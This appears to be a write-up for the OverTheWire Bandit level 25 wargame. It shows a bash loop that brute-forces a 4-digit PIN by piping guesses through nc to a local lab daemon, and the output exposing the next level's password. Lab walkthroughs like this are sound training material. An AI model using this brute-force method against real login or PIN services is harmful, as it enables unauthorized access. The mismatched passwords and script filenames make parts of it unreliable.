# OverTheWire Wargames: Bandit Level 25 Walkthrough
***https://medium.com/@anshumansingh_71873/overthewire-wargames-c5568fe4b4d7***

![image](https://github.com/user-attachments/assets/5b51c077-19e9-44a6-aa69-3a5adec14279)

## Level Overview
***Bandit Level 25:** https://overthewire.org/wargames/bandit/bandit25.html*

***Goal:** Interact with a daemon running on port `30002`, providing the password for `bandit24` and a secret 4-digit PIN code. Brute-force all possible 4-digit combinations (0000–9999) to find the correct code.*

***SSH:** ssh bandit24@bandit.labs.overthewire.org -p 2220*

***Server:** bandit.labs.overthewire.org*

***Port:** 2220*

***Username:** bandit24*

***Password:** gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8*

![image](https://github.com/user-attachments/assets/81e39eb2-bdb7-4883-a972-b7e5325e6332)

## Solution
1. **Connect to the Daemon:**
   
Begin by testing the connection to the daemon running on the port `30002` using `nc localhost 30002`

The daemon will prompt you for the password and a 4-digit PIN. You can manually test this to understand the interaction flow.

![image](https://github.com/user-attachments/assets/0e7c6ec0-fa78-4b77-8d7e-94f989eec2ce)

2. **Write a Script to Automate Brute-Forcing:**
Since there are 10,000 possible combinations (0000–9999), create a script to brute-force the pin code. Use a for loop to iterate through all possible combinations.

- **Sample Script:**

```bash
#!/bin/bash

for i in {0000..9999}
do
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt
```

- Save this script as `bruteforce.sh` and make it executable:
  
```bash
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ chmod +x brute_force_pin.sh
```

![image](https://github.com/user-attachments/assets/912b64a8-6021-40c4-80f6-449c833479ff)

3. **Run the Script:**
   
Execute the script and monitor its output to identify when the correct PIN code is found:

![image](https://github.com/user-attachments/assets/2baf075d-7986-4fc4-83c4-0f3ade249f5c)

4. **Identify the Correct PIN and Retrieve the Password:**
   
When the correct PIN is sent, the daemon will respond with the password for `bandit25`. Look for the output that differs from the others, as it will display the next password.

```bash
bandit24@bandit:/tmp/tmp.qn2mz5CVQV$ cat result.txt 
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
.
.
.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

bandit24@bandit:/tmp/tmp.qn2mz5CVQV$
```
